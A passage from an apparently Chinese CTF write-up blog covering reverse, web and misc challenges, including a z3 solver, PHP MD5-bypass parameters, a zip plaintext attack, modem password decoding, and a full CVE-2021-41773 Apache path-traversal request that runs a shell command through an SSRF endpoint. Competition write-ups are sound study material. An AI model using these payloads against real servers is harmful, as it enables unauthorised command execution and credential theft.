class="number">81</span>*a5+<span class="number">4</span>*a6+<span class="number">47</span>*a7+<span class="number">8</span>*a8+</span><br><span class="line"><span class="number">1</span>*a9 +<span class="number">46</span>*a10 +<span class="number">7</span>*a11 + <span class="number">85</span>*a12 + <span class="number">60</span>*a13 +<span class="number">26</span>*a14 +<span class="number">57</span>*a15 +</span><br><span class="line"><span class="number">24</span>*a16 + <span class="number">60</span>*a17 + <span class="number">70</span>*a18 + <span class="number">42</span>*a19 + <span class="number">97</span>*a20 +<span class="number">25</span>*a21 +<span class="number">88</span>*a22 +</span><br><span class="line"><span class="number">64</span>*a23 +<span class="number">1</span>*a24 +<span class="number">58</span>*a25 +<span class="number">25</span>*a26 +<span class="number">93</span>*a27 +<span class="number">8</span>*a28+<span class="number">16</span>*a29 +</span><br><span class="line"><span class="number">85</span>*a30 +<span class="number">19</span>*a31==<span class="number">130498</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">9</span>*a1 +<span class="number">88</span>*a2 +<span class="number">7</span>*a3 +<span class="number">54</span>*a4 +<span class="number">77</span>*a5 + <span class="number">34</span>*a6 + <span class="number">58</span>*a7 +<span class="number">43</span>*a8 +</span><br><span class="line"><span class="number">17</span>*a9 +<span class="number">93</span>*a10+<span class="number">15</span>*a11 +<span class="number">84</span>*a12 +<span class="number">65</span>*a13 +<span class="number">64</span>*a14 + <span class="number">34</span>*a15 +</span><br><span class="line"><span class="number">55</span>*a16 + <span class="number">89</span>*a17 + <span class="number">61</span>*a18 +<span class="number">64</span>*a19 + <span class="number">31</span>*a20 + <span class="number">33</span>*a21 +<span class="number">29</span>*a22 +</span><br><span class="line"><span class="number">52</span>*a23 + <span class="number">79</span>*a24 +<span class="number">83</span>*a25 +<span class="number">78</span>*a26 +<span class="number">9</span>*a27 +<span class="number">96</span>*a28+<span class="number">52</span>*a29 +</span><br><span class="line"><span class="number">30</span>*a30+<span class="number">14</span>*a31== <span class="number">153195</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">15</span>*a1 + <span class="number">84</span>*a2 +<span class="number">36</span>*a3+<span class="number">24</span>*a4+ <span class="number">97</span>*a5 + <span class="number">67</span>*a6 +<span class="number">14</span>*a7 +<span class="number">66</span>*a8 +</span><br><span class="line"><span class="number">22</span>*a9 +<span class="number">4</span>*a10 +<span class="number">90</span>*a11 +<span class="number">96</span>*a12 +<span class="number">3</span>*a13 + <span class="number">50</span>*a14 +<span class="number">47</span>*a15 +</span><br><span class="line"><span class="number">7</span>*a16 + <span class="number">67</span>*a17 +<span class="number">33</span>*a18 + <span class="number">5</span>*a19 + <span class="number">52</span>*a20 + <span class="number">56</span>*a21 +<span class="number">55</span>*a22 +</span><br><span class="line"><span class="number">3</span>*a23 +<span class="number">69</span>*a24 +<span class="number">73</span>*a25 +<span class="number">65</span>*a26 +<span class="number">56</span>*a27 +<span class="number">91</span>*a28+<span class="number">98</span>*a29 +</span><br><span class="line"><span class="number">52</span>*a30 +<span class="number">90</span>*a31== <span class="number">154967</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">14</span>*a1+<span class="number">27</span>*a2 +<span class="number">99</span>*a3 +<span class="number">64</span>*a4+ <span class="number">19</span>*a5 + <span class="number">37</span>*a6 +<span class="number">63</span>*a7 +<span class="number">26</span>*a8 +</span><br><span class="line"><span class="number">51</span>*a9 +<span class="number">52</span>*a10 + <span class="number">44</span>*a11 + <span class="number">8</span>*a12 + <span class="number">15</span>*a13+<span class="number">29</span>*a14 +<span class="number">36</span>*a15 +</span><br><span class="line"><span class="number">26</span>*a16 +<span class="number">94</span>*a17 +<span class="number">85</span>*a18 +<span class="number">40</span>*a19+<span class="number">2</span>*a20+<span class="number">75</span>*a21 + <span class="number">10</span>*a22 +</span><br><span class="line"><span class="number">47</span>*a23 +<span class="number">77</span>*a24 +<span class="number">55</span>*a25+<span class="number">77</span>*a26 +<span class="number">88</span>*a27 +<span class="number">12</span>*a28 +<span class="number">36</span>*a29 +</span><br><span class="line"><span class="number">59</span>*a30 +<span class="number">33</span>*a31==<span class="number">131294</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">17</span>*a1 + <span class="number">93</span>*a2 + <span class="number">64</span>*a3 + <span class="number">86</span>*a4 +<span class="number">59</span>*a5 + <span class="number">6</span>*a6 + <span class="number">73</span>*a7 + <span class="number">60</span>*a8 +</span><br><span class="line"><span class="number">7</span>*a9 +<span class="number">83</span>*a10+<span class="number">61</span>*a11 +<span class="number">37</span>*a12 +<span class="number">27</span>*a13 +<span class="number">84</span>*a14 +<span class="number">89</span>*a15 +</span><br><span class="line"><span class="number">65</span>*a16 + <span class="number">17</span>*a17 + <span class="number">47</span>*a18 +<span class="number">60</span>*a19 + <span class="number">32</span>*a20 + <span class="number">37</span>*a21 + <span class="number">62</span>*a22 +</span><br><span class="line"><span class="number">64</span>*a23 +<span class="number">94</span>*a24 +<span class="number">75</span>*a25 + <span class="number">8</span>*a26 +<span class="number">61</span>*a27 +<span class="number">73</span>*a28+<span class="number">17</span>*a29 +</span><br><span class="line"><span class="number">36</span>*a30+<span class="number">81</span>*a31==<span class="number">159522</span>)</span><br><span class="line"></span><br><span class="line">slover.add(<span class="number">76</span>*a1+<span class="number">94</span>*a2 +<span class="number">26</span>*a3+<span class="number">86</span>*a4+ <span class="number">73</span>*a5 + <span class="number">31</span>*a6 + <span class="number">60</span>*a7 +<span class="number">42</span>*a8 +</span><br><span class="line"><span class="number">26</span>*a9 +<span class="number">23</span>*a10 +<span class="number">30</span>*a11 +<span class="number">78</span>*a12 +<span class="number">29</span>*a13 +<span class="number">86</span>*a14 +<span class="number">71</span>*a15 +</span><br><span class="line"><span class="number">87</span>*a16 +<span class="number">30</span>*a17 +<span class="number">88</span>*a18+<span class="number">65</span>*a19+<span class="number">47</span>*a20+<span class="number">28</span>*a21 +<span class="number">17</span>*a22 +</span><br><span class="line"><span class="number">42</span>*a23+<span class="number">17</span>*a24 + <span class="number">42</span>*a25+<span class="number">81</span>*a26 +<span class="number">41</span>*a27 +<span class="number">82</span>*a28 +<span class="number">48</span>*a29 +</span><br><span class="line"><span class="number">67</span>*a30 + <span class="number">90</span>*a31 == <span class="number">165913</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> slover.check() == sat:</span><br><span class="line"></span><br><span class="line">    model = slover.model()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(model)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#102 108 97 103 123 108 48 110 103 95 49 105 118 51 95 116 72 101 95 108 105 84 52 110 103 95 107 105 78 103 125</span></span><br><span class="line"><span class="comment">#flag&#123;l0ng_1iv3_tHe_liT4ng_kiNg&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Web">Web</h2><h3 id="一-ezphp">一.ezphp</h3><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436197-867078061.png" alt="image-20240427145003369"></p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET</span>：</span><br><span class="line">?a[]=<span class="number">1</span>&amp;b[]=<span class="number">0</span>&amp;<span class="symbol">O</span>+<span class="symbol">U</span>+<span class="symbol">C</span>=<span class="number">100</span><span class="comment">%0a&amp;md5=ouc</span></span><br><span class="line"><span class="symbol">POST</span>：</span><br><span class="line">md51[]=<span class="number">1</span>&amp;md52[]=<span class="number">0</span></span><br><span class="line"><span class="symbol">Cookie</span>：</span><br><span class="line">md5=<span class="number">06</span>d92f344c7d8c89cb164353ca0fa070</span><br></pre></td></tr></table></figure><p>这道题我是傻波一，第二个想半天，最后还以为是哈希扩展攻击，结果是白给</p><h3 id="二-菜狗工具-1">二.菜狗工具#1</h3><p><img src="https://img2023.cnblogs.com/blog/3445027/202406/3445027-20240606000436004-1226475815.png" alt="image-20240427145107806"></p><p>题目骂我，我是菜狗:cry:，没啥好说的</p><h2 id="Welcome">@Welcome</h2><h3 id="填个问卷吧！">填个问卷吧！</h3><p>我们就爱这种题</p><h3 id="签到">签到</h3><p>也爱！！！</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高校网络安全管理运维赛2024</title>
      <link href="/posts/17915e48.html"/>
      <url>/posts/17915e48.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1>Misc</h1><h2 id="签到">签到</h2><p>GIF 拆分 字符拼接</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">synt&#123;guvf-vf-gur-fvtava-dhvm&#125;</span><br><span class="line"></span><br><span class="line">ROT13:</span><br><span class="line">flag&#123;this-is-the-signin-quiz&#125;</span><br></pre></td></tr></table></figure><h2 id="钓鱼邮件识别">钓鱼邮件识别</h2><p>打开eml<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715000987869-fef6e026-ab6e-48b6-9021-2bfaea76c5f7.png#averageHue=%23f0eeed&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=581&amp;id=udff21a67&amp;originHeight=872&amp;originWidth=1680&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=95596&amp;status=done&amp;style=none&amp;taskId=u05ad4560-fb10-4616-898b-cda133bda73&amp;title=&amp;width=1120" alt="image.png"><br>base64解码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001044105-c0cd5507-856c-4be4-a5c6-81ae9cdd50b2.png#averageHue=%23f0eeee&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=796&amp;id=u40cbeb7d&amp;originHeight=1194&amp;originWidth=1217&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=299105&amp;status=done&amp;style=none&amp;taskId=u452493a0-5876-4ab4-a782-0e3fd32b6b6&amp;title=&amp;width=811.3333333333334" alt="image.png"></p><h3 id="Flag1">Flag1</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001095282-61c50ca4-113e-4166-a0dc-5e30556e66f1.png#averageHue=%23f2f0f0&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=154&amp;id=u298f23e6&amp;originHeight=231&amp;originWidth=1207&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=57021&amp;status=done&amp;style=none&amp;taskId=u629f2172-4f06-471e-ae52-b029e298d61&amp;title=&amp;width=804.6666666666666" alt="image.png"></p><h3 id="Flag2">Flag2</h3><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001124983-548bb90b-03a6-43f9-944c-771e6b3d6a61.png#averageHue=%23e5e5e1&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=56&amp;id=uc548bc24&amp;originHeight=84&amp;originWidth=283&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=10693&amp;status=done&amp;style=none&amp;taskId=u21d028cf-74ce-4e2b-8c6e-c25ddd55428&amp;title=&amp;width=188.66666666666666" alt="image.png"></p><h3 id="Flag3">Flag3</h3><p>第三段解析DNS的记录<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001261727-291d9bf4-b786-4932-a8df-dd9f00697bb6.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=736&amp;id=u91730a03&amp;originHeight=1104&amp;originWidth=1509&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=117830&amp;status=done&amp;style=none&amp;taskId=u76ac0f79-b444-4261-96e7-e57dbf97cb5&amp;title=&amp;width=1006" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001299780-c1782382-0fb4-4ca7-9251-c3cad35c76d0.png#averageHue=%23f4f4f3&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=819&amp;id=u0f3a6024&amp;originHeight=1228&amp;originWidth=1787&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=156994&amp;status=done&amp;style=none&amp;taskId=ua783e53a-f8ac-4e0c-8f39-bbce8619212&amp;title=&amp;width=1191.3333333333333" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715001333207-14d79fb1-0bd1-4621-861c-02cc90060d10.png#averageHue=%23f4f4f4&amp;clientId=u27152c86-e274-4&amp;from=paste&amp;height=743&amp;id=ud216f656&amp;originHeight=1114&amp;originWidth=1757&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=122717&amp;status=done&amp;style=none&amp;taskId=ua65b1fa8-c3b3-4e1d-8277-02485e45c02&amp;title=&amp;width=1171.3333333333333" alt="image.png"></p><h2 id="easyshell">easyshell</h2><p>追踪流到倒数几个服务器流量解密发现如下<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001338674-b5b72b11-14fe-4801-bb12-512dbc2055c7.png#averageHue=%23f1eee3&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=685&amp;id=uae05dd4f&amp;originHeight=1028&amp;originWidth=2273&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=365427&amp;status=done&amp;style=none&amp;taskId=u9d4285e5-ac30-459f-9259-d4cf393aa7c&amp;title=&amp;width=1515.3333333333333" alt="image.png"><br>pk头，是zip，保存成zip文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1715001645217-5d17990d-6c8c-4465-b275-35ea6f729738.png#averageHue=%23e6e5e4&amp;clientId=u97ca04e8-5b2a-4&amp;from=paste&amp;height=533&amp;id=u89338278&amp;originHeight=799&amp;originWidth=2301&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=287706&amp;status=done&amp;style=none&amp;taskId=ucc729f83-9ae1-45ca-95c0-a6d56ce6d5f&amp;title=&amp;width=1534" alt="image.png"><br>还发现了secret2.txt的内容<br>用上述txt，明文攻击zip<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40978818/1715001905837-864105ca-f4d3-4a3f-9c95-0245f0ea4213.png#averageHue=%23161616&amp;clientId=u1afddc1b-603e-4&amp;from=paste&amp;height=177&amp;id=ua192efbe&amp;originHeight=276&amp;originWidth=1306&amp;originalType=binary&amp;ratio=1.5625&amp;rotation=0&amp;showTitle=false&amp;size=35216&amp;status=done&amp;style=none&amp;taskId=u21076285-af22-44b2-a780-639183be2db&amp;title=&amp;width=835.84" alt="image.png"><br>用明文攻击获取到的key直接解secret1.txt<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002034550-435df7d3-1d87-4d19-bd0f-e9d58ffa7c59.png#averageHue=%23e9e8e7&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=371&amp;id=uabab6e87&amp;originHeight=557&amp;originWidth=571&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=114715&amp;status=done&amp;style=none&amp;taskId=u3e46b3da-e009-42ed-9215-d3124941c50&amp;title=&amp;width=380.6666666666667" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715002091520-7cfff066-25f7-45f8-834b-e5bb657af9c1.png#averageHue=%23d1a970&amp;clientId=uc38c9fc2-51bb-4&amp;from=paste&amp;height=231&amp;id=udaace66e&amp;originHeight=347&amp;originWidth=1335&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=68080&amp;status=done&amp;style=none&amp;taskId=u6f8be26f-5e1e-4c2f-b7c1-23145c69071&amp;title=&amp;width=890" alt="image.png"></p><h2 id="SecretDB">SecretDB</h2><p>用DB Browser for SQLite查看数据库，但是说flag不在这里<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008667764-0af23da2-58f8-4414-81e6-ed0f8c87301c.png#averageHue=%23f7f7f6&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=313&amp;id=u586e86e7&amp;originHeight=391&amp;originWidth=1266&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=30839&amp;status=done&amp;style=none&amp;taskId=u4e4db746-4cc3-4594-93e8-d9d9b968c13&amp;title=&amp;width=1012.8" alt="image.png"><br>放到010中，发现这句话下面还藏着点东西，在01 0F之间有东西<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715008933494-3b65d672-7a46-4b52-ab2d-94c5abb2123a.png#averageHue=%2386c292&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=406&amp;id=tOoxc&amp;originHeight=508&amp;originWidth=659&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=55792&amp;status=done&amp;style=none&amp;taskId=u489604f7-52c6-4411-ad0d-04475762b90&amp;title=&amp;width=527.2" alt="image.png"><br>然后写脚本进行提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;secret.db&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    c = f.read()</span><br><span class="line"></span><br><span class="line">flag = &#123;&#125;</span><br><span class="line">parts = c.split(<span class="string">b&#x27;\x01\x0f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> parts[<span class="number">1</span>:-<span class="number">2</span>]:  <span class="comment"># 修正切片范围</span></span><br><span class="line">    flag[i[<span class="number">0</span>]] = <span class="built_in">chr</span>(i[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接按照排序后的键值对打印结果</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">sorted</span>(flag.keys()):</span><br><span class="line">    <span class="built_in">print</span>(flag[k], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者使用下面的一行代码来替代上面的 for 循环</span></span><br><span class="line"><span class="comment"># print(&#x27;&#x27;.join([flag[k] for k in sorted(flag.keys())]))</span></span><br></pre></td></tr></table></figure><h2 id="Gateway">Gateway</h2><p>在附件中找到了密码，但还是编码的<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715006887010-6a828109-1d9a-441e-bc11-9f8886d24aea.png#averageHue=%23fcfaf9&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=546&amp;id=pD8i3&amp;originHeight=682&amp;originWidth=1429&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=106870&amp;status=done&amp;style=none&amp;taskId=u5b2fa89a-8cf7-4209-b10f-a85f6b49e4c&amp;title=&amp;width=1143.2" alt="image.png"><br>在题目附件里发现这个，联想到电信光猫的超密解密<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40618712/1715009440301-bf91241e-f275-4c43-9729-fa66683d8488.png#averageHue=%23e4f2f0&amp;clientId=ue02307c4-04be-4&amp;from=paste&amp;height=84&amp;id=u807f3ad5&amp;originHeight=105&amp;originWidth=534&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=46720&amp;status=done&amp;style=none&amp;taskId=uee655861-9d30-49c5-988f-6d76061f717&amp;title=&amp;width=427.2" alt="image.png"><br>参考内容<br><a href="https://cloud.tencent.com/developer/article/2006614">破解光猫超级管理员密码，也就是获取telecomadmin的密码</a><br>把里面的数字提取，然后三位数的内容把数字减掉4，从ASCII转字符即可，其他部分直接从ASCII转成字符即可，拼在一起</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">numbers = <span class="selector-attr">[106, 112, 101, 107, 127, 101, 104, 49, 57, 56, 53, 56, 54, 56, 49, 51, 51, 105, 56, 103, 106, 49, 56, 50, 56, 103, 102, 56, 52, 101, 104, 102, 105, 53, 101, 53, 102, 129]</span></span><br><span class="line"></span><br><span class="line">decode = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> numbers:</span><br><span class="line">    <span class="keyword">if</span> <span class="selector-tag">i</span> <span class="comment">// 100 != 0:</span></span><br><span class="line">        decode += <span class="built_in">chr</span>(<span class="selector-tag">i</span> - <span class="number">4</span>)    #三位数的按字母处理</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        decode += <span class="built_in">chr</span>(i)        #两位数的按数字处理</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(decode)</span></span></span><br></pre></td></tr></table></figure><h2 id="Apache">Apache</h2><ul><li>源码：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,send_file</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">app = Flask(<span class="string">&quot;webserver&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/nc&#x27;</span>,methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nc</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dstport=<span class="built_in">int</span>(request.form[<span class="string">&#x27;port&#x27;</span>])</span><br><span class="line">        data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(<span class="number">1</span>)</span><br><span class="line">        s.connect((<span class="string">&#x27;127.0.0.1&#x27;</span>, dstport))</span><br><span class="line">        s.send(data.encode())</span><br><span class="line">        recvdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            chunk = s.recv(<span class="number">2048</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> chunk.strip():</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                recvdata += chunk</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">return</span> recvdata</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">8080</span>,threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>CVE-2021-41773<br><a href="https://blog.csdn.net/luochen2436/article/details/120698682">https://blog.csdn.net/luochen2436/article/details/120698682</a><br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">port</span>=<span class="number">80</span>&amp;data=POST%<span class="number">20</span>%<span class="number">2</span>fcgi-bin%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>f.%<span class="number">252</span>e%<span class="number">2</span>fbin%<span class="number">2</span>fsh%<span class="number">20</span>HTTP%<span class="number">2</span>f1.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aHost%<span class="number">3</span>a%<span class="number">20127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept%<span class="number">3</span>a%<span class="number">20</span>*%<span class="number">2</span>f*%<span class="number">0</span>d%<span class="number">0</span>aAccept-Language%<span class="number">3</span>a%<span class="number">20</span>zh-CN%<span class="number">2</span>czh%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">8</span>%<span class="number">2</span>czh-TW%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">7</span>%<span class="number">2</span>czh-HK%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">5</span>%<span class="number">2</span>cen-US%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">3</span>%<span class="number">2</span>cen%<span class="number">3</span>bq%<span class="number">3</span>d0.<span class="number">2</span>%<span class="number">0</span>d%<span class="number">0</span>aAccept-Encoding%<span class="number">3</span>a%<span class="number">20</span>gzip%<span class="number">2</span>c%<span class="number">20</span>deflate%<span class="number">0</span>d%<span class="number">0</span>aContent-Type%<span class="number">3</span>a%<span class="number">20</span>application%<span class="number">2</span>fx-www-form-urlencoded%<span class="number">0</span>d%<span class="number">0</span>aCache%<span class="number">3</span>a%<span class="number">20</span>no-cache%<span class="number">0</span>d%<span class="number">0</span>aContent-Length%<span class="number">3</span>a%<span class="number">2012</span>%<span class="number">0</span>d%<span class="number">0</span>aConnection%<span class="number">3</span>a%<span class="number">20</span>close%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>aecho%<span class="number">3</span>bcat%<span class="number">20</span>%<span class="number">2</span>ff*%<span class="number">0</span>d%<span class="number">0</span>a%<span class="number">0</span>d%<span class="number">0</span>a</span><br></pre></td></tr></table></figure><h2 id="f-or-r">f or r</h2><p>一层一层解压.cab文件，找到Cab for KB114514 PSFX，发现跟前两天的GeekCTF的题有点像<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000942707-a763ffbe-d4f5-490e-92f6-32bd3b39dfaa.png#averageHue=%23f8f7f5&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=128&amp;id=u4475e9fb&amp;originHeight=192&amp;originWidth=496&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=11091&amp;status=done&amp;style=none&amp;taskId=u02652051-23f7-4995-b420-0dbb8af714b&amp;title=&amp;width=330.6666666666667" alt="image.png"><br>参考链接：<br><a href="https://qanux.github.io/2024/04/22/geek2024/index.html">https://qanux.github.io/2024/04/22/geek2024/index.html</a><br>利用脚本进行更新<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000915845-57755e75-109f-4bcd-92d8-01649e10567f.png#averageHue=%23e9e9e9&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=79&amp;id=u5b8ab700&amp;originHeight=119&amp;originWidth=1138&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=19958&amp;status=done&amp;style=none&amp;taskId=uc31c430d-408b-46fb-89b1-4fcbfd0d67c&amp;title=&amp;width=758.6666666666666" alt="image.png"><br>这里的o_curl.exe是当前自己系统的curl.exe，-o是要输出的文件名，r为回滚的，要把这个r里的解压出来的文件替换成自己系统的补丁里的，f里的是压缩包里的（事实上就这一个有用的）<br>出来个nnn.exe<br>自己系统补丁位置：<br><img src="https://cdn.nlark.com/yuque/0/2024/png/43707272/1715000871074-f02c0e14-6dd7-4369-80b2-ab0fc49ce6d3.png#averageHue=%23f9f8f8&amp;clientId=u506acabf-9db4-4&amp;from=paste&amp;height=134&amp;id=u3b91cc18&amp;originHeight=201&amp;originWidth=773&amp;originalType=binary&amp;ratio=1.5&amp;rotation=0&amp;showTitle=false&amp;size=16654&amp;status=done&amp;style=none&amp;taskId=ub71bc11d-2583-43a8-bd2f-98de89d2d2e&amp;title=&amp;width=515.3333333333334" alt="image.png"><br>大概就是在winsxs中搜索curl有关的文件（也可能不是这里边的，在其他补丁里，直接全局搜也行）<br>运行命令后得到最终输出的文件<br>看下版本<br><img 